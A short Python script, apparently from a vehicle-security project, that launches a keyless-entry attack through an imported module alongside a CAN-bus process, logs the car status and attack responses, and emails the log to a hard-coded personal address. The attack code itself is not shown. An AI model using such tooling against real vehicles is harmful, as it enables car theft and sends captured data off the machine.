from car_can import CarCan
from KeyLessEntryAttack import KLE
import multiprocessing
from email_feature import send_email
def create_log(k: KLE, c: CarCan):
    with open('log.log', 'w+') as f:
        f.write(c.car_status)
        f.writelines(k.response_messages)
    print("Log created")


if __name__ == '__main__':
    print("E-Vehicle Attack Log")
    option = int(input("PLease select \n Try Keyless entry attack, \n try known channel attack"))
    if option == 1:
        k = KLE()
        can = CarCan()
        proc1 = multiprocessing.Process(target=can.start_dst)
        proc2 = multiprocessing.Process(target=k.launch_attack, args=(1, 30))
        proc1.start()
        proc2.start()
        proc1.join()
        proc2.join()
        create_log(k, can)
        send_email('achawla489@gmail.com', 'Car KLE log recieved', '', 'log.log')